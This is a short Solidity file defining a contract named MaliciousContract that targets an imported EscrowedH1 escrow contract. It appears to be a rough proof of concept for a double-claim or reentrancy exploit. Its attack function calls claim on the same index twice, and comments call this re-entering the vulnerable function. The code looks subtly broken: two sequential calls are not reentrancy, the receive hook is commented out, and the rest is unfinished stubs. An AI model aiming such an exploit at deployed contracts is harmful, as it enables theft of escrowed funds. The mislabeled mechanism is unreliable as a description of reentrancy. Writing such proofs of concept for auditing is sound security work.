// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./EscrowedH1.sol";
contract MaliciousContract is EscrowedH1 {
    EscrowedH1 escrowedH1;

    constructor(address payable escrowedH1CollectionAddress) {
        escrowedH1 = EscrowedH1(escrowedH1CollectionAddress);
    }

    function attack(uint256 index) public {
        // Call the vulnerable function
        escrowedH1.claim(index);
        
        // Re-enter the vulnerable function
        escrowedH1.claim(index);
    }

    // function mintTokens()


    // function vest(uint256 amount) external { 
    
    // escrowedH1.startVesting(uint256)

    // }

    // receive() external payable {
    //     // Do nothing
    // }
}